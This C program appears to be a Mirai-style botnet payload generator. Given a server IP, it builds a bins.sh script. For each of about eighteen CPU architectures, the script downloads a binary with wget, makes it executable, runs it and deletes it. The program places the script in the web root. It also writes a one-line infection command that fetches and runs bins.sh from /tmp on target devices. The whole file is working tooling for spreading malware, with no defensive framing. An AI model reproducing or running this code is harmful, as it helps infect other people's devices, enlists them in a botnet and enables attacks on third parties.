#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
	
	if(argc != 2) {
		printf("Usage: %s IP\n", argv[0]);
		exit(0);
	}
	
	char buf[1000] = {0};
	char *ip;
	ip = argv[1];
	
	printf("Making SH File\n");
	sprintf(buf, "echo 'wget http://%s/bins/i486;chmod 777 i486;./i486;rm -rf i486' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/i686;chmod 777 i686;./i686;rm -rf i686' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/mips;chmod 777 mips;./mips;rm -rf mips' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/mips64;chmod 777 mips64;./mips64;rm -rf mips64' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/mpsl;chmod 777 mpsl;./mpsl;rm -rf mpsl' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/armeb;chmod 777 armeb;./armeb;rm -rf armeb' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/armtl;chmod 777 armtl;./armtl;rm -rf armtl' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/arm;chmod 777 arm;./arm;rm -rf arm' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/arm5;chmod 777 arm5;./arm5;rm -rf arm5' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/arm6;chmod 777 arm6;./arm6;rm -rf arm6' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/arm7;chmod 777 arm7;./arm7;rm -rf arm7' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/ppc-440fp;chmod 777 ppc-440fp;./ppc-440fp;rm -rf ppc-440fp' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/ppc;chmod 777 ppc;./ppc;rm -rf ppc' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/spc;chmod 777 spc;./spc;rm -rf spc' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/m68k;chmod 777 m68k;./m68k;rm -rf m68k' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/sh4;chmod 777 sh4;./sh4;rm -rf sh4' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/arc;chmod 777 arc;./arc;rm -rf arc' >> bins.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/bins/x64;chmod 777 x64;./x64;rm -rf x64' >> bins.sh", ip);
	system(buf);
	printf("Finished Making SH FILE\n");
	sleep(1);
	printf("Moving SH File\n");
	system("mv bins.sh /var/www/html");
	sleep(1);
	printf("Payload in text file!\n");
	sprintf(buf, "echo 'cd /tmp || cd /etc;wget http://%s/bins.sh;chmod 777 bins.sh;./bins.sh;rm -rf bins.sh' >> payload.txt", ip);
	system(buf);
	exit(0);
}